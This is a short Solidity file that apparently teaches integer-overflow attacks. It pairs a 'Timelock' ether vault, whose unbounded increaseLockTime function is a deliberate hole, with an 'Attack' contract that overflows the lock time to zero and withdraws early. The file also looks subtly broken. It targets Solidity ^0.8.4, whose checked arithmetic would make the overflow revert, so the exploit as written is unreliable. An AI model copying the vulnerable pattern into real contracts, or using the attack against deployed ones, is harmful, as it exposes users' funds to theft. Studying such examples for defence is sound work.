// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract Timelock {
    using  SafeMath for uint;
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable{
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _time) public {
        lockTime[msg.sender] += _time;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "You don't have enough ether");
        require(block.timestamp > lockTime[msg.sender], "The time as not yet expired");

        uint bal = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Transaction failed");
    }
}

contract Attack {
    Timelock timelock;
    constructor(Timelock _timelock){
        timelock = Timelock(_timelock);
    }

    fallback() external payable{}

    function attack() public payable{
        timelock.deposit{value: msg.value}();

        timelock.increaseLockTime(
            type(uint).max +1 - timelock.lockTime(address(this))
        );
        timelock.withdraw();
    }
}